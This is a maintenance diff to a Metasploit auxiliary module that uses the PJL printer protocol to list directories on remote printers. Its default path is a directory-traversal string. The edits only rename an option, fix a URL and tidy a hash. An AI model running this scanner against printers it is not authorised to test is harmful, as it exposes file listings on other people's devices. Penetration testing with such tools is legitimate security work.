@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -34,32 +34,32 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(Rex::Proto::PJL::DEFAULT_PORT),
-      OptString.new("PATHNAME", [true, "Pathname", '0:\..\..\..'])
+      OptString.new("PATH", [true, "Remote path", '0:\..\..\..'])
     ], self.class)
   end
 
   def run_host(ip)
-    pathname = datastore["PATHNAME"]
+    path = datastore["PATH"]
 
     connect
     pjl = Rex::Proto::PJL::Client.new(sock)
     pjl.begin_job
 
-    pjl.fsinit(pathname[0..1])
-    listing = pjl.fsdirlist(pathname)
+    pjl.fsinit(path[0..1])
+    listing = pjl.fsdirlist(path)
 
     pjl.end_job
     disconnect
 
     if listing
       print_good("#{ip}:#{rport} - #{listing}")
-      report_note({
+      report_note(
         :host => ip,
         :port => rport,
         :proto => "tcp",
         :type => "printer.dir.listing",
         :data => listing
-      })
+      )
     end
   end
 
